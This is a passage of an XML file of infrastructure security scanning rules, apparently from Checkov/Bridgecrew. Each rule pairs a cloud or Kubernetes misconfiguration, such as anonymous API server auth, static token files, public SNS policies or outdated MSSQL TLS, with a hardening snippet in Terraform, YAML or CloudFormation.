<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> google_container_cluster</li>
<li><strong>Argument:</strong> enable_shielded_nodes</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_container_cluster" "success" {
  name               = var.name
  location           = var.location
  initial_node_count = 1
  project            = data.google_project.project.name

+ enable_shielded_nodes = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-shielded-gke-nodes-are-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-shielded-gke-nodes-are-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-shielded-gke-nodes-are-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_72</key>
    <name>Ensure integrity monitoring for shielded GKE nodes is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="integrity-monitoring-for-shielded-gke-nodes-is-not-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-integrity-monitoring-for-shielded-gke-nodes-is-not-enabled"></div>Integrity monitoring for shielded GKE nodes is not enabled</div><a aria-label="Skip link to Integrity monitoring for shielded GKE nodes is not enabled" class="heading-anchor-icon fa fa-anchor" href="#integrity-monitoring-for-shielded-gke-nodes-is-not-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enable Integrity Monitoring for Shielded GKE Nodes to be notified of inconsistencies during the node boot sequence.<br/>
Integrity Monitoring provides active alerting for Shielded GKE nodes which allows administrators to respond to integrity failures and prevent compromised nodes from being deployed into the cluster.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> google_container_cluster / google_container_node_pool</li>
<li><strong>Argument:</strong> node_config.shielded_instance_config.enable_integrity_monitoring</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_container_cluster" "fail" {
  name               = var.name
  location           = var.location
  initial_node_count = 1
  project            = data.google_project.project.name

  node_config {

    shielded_instance_config {
-     enable_integrity_monitoring = false
    }
  }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-integrity-monitoring-for-shielded-gke-nodes-is-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-integrity-monitoring-for-shielded-gke-nodes-is-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-integrity-monitoring-for-shielded-gke-nodes-is-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_68</key>
    <name>Ensure the --anonymous-auth argument is set to False</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---anonymous-auth-argument-is-not-set-to-false"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-anonymous-auth-argument-is-not-set-to-false"></div>The --anonymous-auth argument is not set to False</div><a aria-label="Skip link to The --anonymous-auth argument is not set to False" class="heading-anchor-icon fa fa-anchor" href="#the---anonymous-auth-argument-is-not-set-to-false"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Disable anonymous requests to the API server. When enabled, requests that are not rejected by other configured authentication methods are treated as anonymous requests. These requests are then served by the API server. You should rely on authentication to authorize access and disallow anonymous requests.<br/>
If you are using RBAC authorization, it is generally considered reasonable to allow anonymous access to the API Server for health checks and discovery purposes, and hence this recommendation is not scored. However, you should consider whether anonymous discovery is an acceptable risk for your purposes.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind</strong>: Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
+   - kube-apiserver
+   - --anonymous-auth=false
    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
    ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-anonymous-auth-argument-is-set-to-false-1' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-anonymous-auth-argument-is-set-to-false-1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-anonymous-auth-argument-is-set-to-false-1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_69</key>
    <name>Ensure the --basic-auth-file argument is not Set</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---basic-auth-file-argument-is-set"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-basic-auth-file-argument-is-set"></div>The --basic-auth-file argument is Set</div><a aria-label="Skip link to The --basic-auth-file argument is Set" class="heading-anchor-icon fa fa-anchor" href="#the---basic-auth-file-argument-is-set"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Do not use basic authentication. Basic authentication uses plaintext credentials for authentication. Currently, the basic authentication credentials last indefinitely, and the password cannot be changed without restarting the API server. The basic authentication is currently supported for convenience. Hence, basic authentication should not be used.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
    - kube-apiserver
    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
    livenessProbe:
      failureThreshold: 8
      httpGet:
        host: 127.0.0.1
        path: /healthz
        port: 6443
        scheme: HTTPS
      initialDelaySeconds: 15
      timeoutSeconds: 15
    name: kube-apiserver
    resources:
      requests:
        cpu: 250m
    volumeMounts:
    - mountPath: /etc/kubernetes/
      name: k8s
      readOnly: true
    - mountPath: /etc/ssl/certs
      name: certs
    - mountPath: /etc/pki
      name: pki
  hostNetwork: true
  volumes:
  - hostPath:
      path: /etc/kubernetes
    name: k8s
  - hostPath:
      path: /etc/ssl/certs
    name: certs
  - hostPath:
      path: /etc/pki
    name: pki
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-basic-auth-file-argument-is-not-set' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-basic-auth-file-argument-is-not-set</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-basic-auth-file-argument-is-not-set' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_70</key>
    <name>Ensure the --token-auth-file argument is not Set</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---token-auth-file-argument-is-set"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-token-auth-file-argument-is-set"></div>The --token-auth-file argument is Set</div><a aria-label="Skip link to The --token-auth-file argument is Set" class="heading-anchor-icon fa fa-anchor" href="#the---token-auth-file-argument-is-set"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Do not use token based authentication. The token-based authentication utilizes static tokens to authenticate requests to the apiserver. The tokens are stored in clear-text in a file on the apiserver, and cannot be revoked or rotated without restarting the apiserver. Hence, do not use static token-based authentication.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
    - kube-apiserver
    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
    livenessProbe:
      failureThreshold: 8
      httpGet:
        host: 127.0.0.1
        path: /healthz
        port: 6443
        scheme: HTTPS
      initialDelaySeconds: 15
      timeoutSeconds: 15
    name: kube-apiserver
    resources:
      requests:
        cpu: 250m
    volumeMounts:
    - mountPath: /etc/kubernetes/
      name: k8s
      readOnly: true
    - mountPath: /etc/ssl/certs
      name: certs
    - mountPath: /etc/pki
      name: pki
  hostNetwork: true
  volumes:
  - hostPath:
      path: /etc/kubernetes
    name: k8s
  - hostPath:
      path: /etc/ssl/certs
    name: certs
  - hostPath:
      path: /etc/pki
    name: pki
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-token-auth-file-parameter-is-not-set' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-token-auth-file-parameter-is-not-set</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-token-auth-file-parameter-is-not-set' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_71</key>
    <name>Ensure the --kubelet-https argument is set to True</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---kubelet-https-argument-is-not-set-to-true"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-kubelet-https-argument-is-not-set-to-true"></div>The --kubelet-https argument is not set to True</div><a aria-label="Skip link to The --kubelet-https argument is not set to True" class="heading-anchor-icon fa fa-anchor" href="#the---kubelet-https-argument-is-not-set-to-true"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Use https for kubelet connections. Connections from apiserver to kubelets could potentially carry sensitive data such as secrets and keys. It is thus important to use in-transit encryption for any communication between the apiserver and kubelets.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
+   - kube-apiserver
+   - --kubelet-https=true
    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
    ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-kubelet-https-argument-is-set-to-true' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-kubelet-https-argument-is-set-to-true</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-kubelet-https-argument-is-set-to-true' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_169</key>
    <name>Ensure SNS topic policy is not public by only allowing specific services or principals to access it</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="sns-topic-policy-is-public-and-access-is-not-restricted-to-specific-services-or-principals"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-sns-topic-policy-is-public-and-access-is-not-restricted-to-specific-services-or-principals"></div>SNS topic policy is public and access is not restricted to specific services or principals</div><a aria-label="Skip link to SNS topic policy is public and access is not restricted to specific services or principals" class="heading-anchor-icon fa fa-anchor" href="#sns-topic-policy-is-public-and-access-is-not-restricted-to-specific-services-or-principals"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_sns_topic_policy</li>
<li><strong>Argument</strong>:  Statement</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_s3_bucket.test.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_s3_bucket.test.tf">resource "aws_sns_topic_policy" "sns_tp1" {
    ...
  policy = &lt;&lt;POLICY
{
    "Version":"2012-10-17",
    "Statement":[
       {
          "Principal": "*",
    +     "Effect": "Deny",
          "Action": [
            "SNS:Subscribe",
            "SNS:SetTopicAttributes",
            "SNS:RemovePermission",
            "SNS:Receive",
            "SNS:Publish",
            "SNS:ListSubscriptionsByTopic",
            "SNS:GetTopicAttributes",
            "SNS:DeleteTopic",
            "SNS:AddPermission",
          ],
          "Resource": "${aws_sns_topic.test.arn}"
       }
    ]
}
POLICY
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-sns-topic-policy-is-not-public-by-only-allowing-specific-services-or-principals-to-access-it' target='_blank'> https://docs.bridgecrew.io/docs/ensure-sns-topic-policy-is-not-public-by-only-allowing-specific-services-or-principals-to-access-it</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-sns-topic-policy-is-not-public-by-only-allowing-specific-services-or-principals-to-access-it' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_170</key>
    <name>Ensure QLDB ledger permissions mode is set to STANDARD</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="qldb-ledger-permissions-mode-is-not-set-to-standard"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-qldb-ledger-permissions-mode-is-not-set-to-standard"></div>QLDB ledger permissions mode is not set to STANDARD</div><a aria-label="Skip link to QLDB ledger permissions mode is not set to STANDARD" class="heading-anchor-icon fa fa-anchor" href="#qldb-ledger-permissions-mode-is-not-set-to-standard"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Amazon Quantum Ledger Database (Amazon QLDB) is a fully managed ledger database for cryptographically verifiable transaction logging. You can use the QLDB API or the AWS Command Line Interface (AWS CLI) to create, update, and delete ledgers in Amazon QLDB. You can also list all the ledgers in your account, or get information about a specific ledger.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_qldb_ledger</li>
<li><strong>Argument</strong>:  permissions_mode</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_s3_bucket.test.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_s3_bucket.test.tf">resource "aws_qldb_ledger" "standard" {
  ...
+ permissions_mode = "STANDARD"
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource</strong>: AWS::QLDB::Ledger</li>
<li><strong>Argument</strong>:  Properties.PermissionsMode</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  Default:
    Type: "AWS::QLDB::Ledger"
    Properties:
      ...
+     PermissionsMode: "STANDARD"
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-qldb-ledger-permissions-mode-is-set-to-standard-1' target='_blank'> https://docs.bridgecrew.io/docs/ensure-qldb-ledger-permissions-mode-is-set-to-standard-1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-qldb-ledger-permissions-mode-is-set-to-standard-1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_171</key>
    <name>Ensure EMR Cluster security configuration encryption uses SSE-KMS</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="emr-cluster-is-not-configured-with-sse-kms-for-data-at-rest-encryption-amazon-s3-with-emrfs"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-emr-cluster-is-not-configured-with-sse-kms-for-data-at-rest-encryption-amazon-s-3-with-emrfs"></div>EMR cluster is not configured with SSE KMS for data at rest encryption (Amazon S3 with EMRFS)</div><a aria-label="Skip link to EMR cluster is not configured with SSE KMS for data at rest encryption (Amazon S3 with EMRFS)" class="heading-anchor-icon fa fa-anchor" href="#emr-cluster-is-not-configured-with-sse-kms-for-data-at-rest-encryption-amazon-s3-with-emrfs"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_emr_security_configuration</li>
<li><strong>Argument</strong>:  EnableAtRestEncryption</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_emr_security_configuration.test.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_emr_security_configuration.test.tf">resource "aws_emr_security_configuration" "test" {
  ...
  configuration = &lt;&lt;EOF
{
  "EncryptionConfiguration": {
    "EnableAtRestEncryption": true,
    "AtRestEncryptionConfiguration": {
      "S3EncryptionConfiguration": {
+       "EncryptionMode": "SSE-KMS",
+       "AwsKmsKey": "${module.encryption_module.kms_key_alias}"
      },
      "LocalDiskEncryptionConfiguration": {
        "EncryptionKeyProviderType": "AwsKms",
        "AwsKmsKey": "${module.encryption_module.kms_key_alias}"
      }
    },
    "EnableInTransitEncryption": true
  }
}
EOF
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-emr-cluster-security-configuration-encryption-uses-sse-kms' target='_blank'> https://docs.bridgecrew.io/docs/ensure-emr-cluster-security-configuration-encryption-uses-sse-kms</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-emr-cluster-security-configuration-encryption-uses-sse-kms' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_52</key>
    <name>Ensure MSSQL is using the latest version of TLS encryption</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="mssql-is-not-using-the-latest-version-of-tls-encryption"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-mssql-is-not-using-the-latest-version-of-tls-encryption"></div>MSSQL is not using the latest version of TLS encryption</div><a aria-label="Skip link to MSSQL is not using the latest version of TLS encryption" class="heading-anchor-icon fa fa-anchor" href="#mssql-is-not-using-the-latest-version-of-tls-encryption"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The Transport Layer Security (TLS) protocol secures transmission of data between servers and web browsers, over the Internet, using standard encryption technology. To follow security best practices and the latest PCI compliance standards, enable the latest version of TLS protocol (i.e. TLS 1.2) for all your MSSQL servers.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_mssql_server</li>
<li><strong>Argument</strong>:  minimum_tls_version</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_mssql_server" "examplea" {
   ...
 + minimum_tls_version           = "1.2"
   ...
 }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-mssql-is-using-the-latest-version-of-tls-encryption' target='_blank'> https://docs.bridgecrew.io/docs/ensure-mssql-is-using-the-latest-version-of-tls-encryption</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-mssql-is-using-the-latest-version-of-tls-encryption' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
